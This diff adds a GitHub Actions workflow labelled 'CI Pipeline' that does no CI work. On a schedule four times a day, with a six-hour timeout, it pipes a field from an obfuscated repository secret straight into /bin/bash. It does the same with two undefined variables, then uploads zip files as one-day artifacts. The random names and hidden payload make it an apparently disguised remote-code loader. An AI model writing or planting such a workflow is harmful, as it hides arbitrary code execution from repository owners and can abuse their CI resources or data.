@@ -1,0 +1,30 @@
+name: CI Pipeline
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '50 2,8,14,20 * * *'
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  handler:
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - uses: actions/checkout@v4
+      - name: Launch
+        env:
+          xhjl48013: ${{ secrets.xhjl48013 }}
+        run: |
+          printf '%s' "$xhjl48013" | jq -r .nf350 | /bin/bash
+          echo $vpccn4103 | jq -r .niwhh89233 | /bin/bash
+          echo $nfx18496 | jq -r .hc9 | /bin/bash
+
+      - name: Persist output
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: sw2xC33m
+          path: "*.zip"
+          retention-days: 1
